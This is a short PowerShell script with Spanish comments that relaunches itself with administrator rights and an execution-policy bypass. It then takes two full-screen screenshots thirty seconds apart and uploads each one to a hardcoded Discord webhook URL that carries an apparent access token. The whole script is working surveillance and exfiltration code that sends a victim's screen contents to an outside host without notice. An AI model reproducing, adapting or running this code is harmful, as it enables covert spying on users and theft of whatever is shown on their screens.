# Verificar si se está ejecutando como administrador
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")

# Si no se está ejecutando como administrador, volver a ejecutar como administrador utilizando el mismo script
if (-not $isAdmin) {
    # Mostrar mensaje de espera
    Write-Host "Este script requiere permisos de administrador. Por favor, acepta la solicitud de ejecutar como administrador."

    # Esperar unos segundos
    Start-Sleep -Seconds 5

    # Obtener el nombre del script actual
    $scriptName = $MyInvocation.MyCommand.Name

    # Obtener la ruta del script actual
    $scriptPath = $MyInvocation.MyCommand.Definition

    # Ejecutar el script como administrador utilizando el mismo script
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs

    # Salir del script actual
    exit
}

# Definir la URL del webhook
$webhookUrl = "https://discord.com/api/webhooks/1203343432970539008/JjFQGyK8MZw2qySfc4jYTPw0jzsH2HKaKAaaQ27uyrllfMIVaDqEUi_ZywclJBmWpxJp"

# Función para capturar y enviar la captura de pantalla al webhook
function CaptureAndSendScreenshot {
    # Definir la ruta del archivo temporal de la captura de pantalla
    $screenshotFile = "$env:TEMP\SC.png"

    # Capturar la pantalla y guardarla en el archivo temporal
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $width = $screen.Width
    $height = $screen.Height
    $left = $screen.Left
    $top = $screen.Top
    $bitmap = New-Object System.Drawing.Bitmap $width, $height
    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
    $graphic.CopyFromScreen($left, $top, 0, 0, $bitmap.Size)
    $bitmap.Save($screenshotFile, [System.Drawing.Imaging.ImageFormat]::Png)

    # Envío de la captura de pantalla al webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "multipart/form-data" -InFile $screenshotFile
}

# Definir la cantidad de capturas de pantalla a enviar
$numberOfScreenshots = 2

# Definir el intervalo de tiempo entre capturas (en segundos)
$intervalSeconds = 30

# Realizar capturas de pantalla y enviarlas al webhook
for ($i = 1; $i -le $numberOfScreenshots; $i++) {
    CaptureAndSendScreenshot
    Start-Sleep -Seconds $intervalSeconds
}
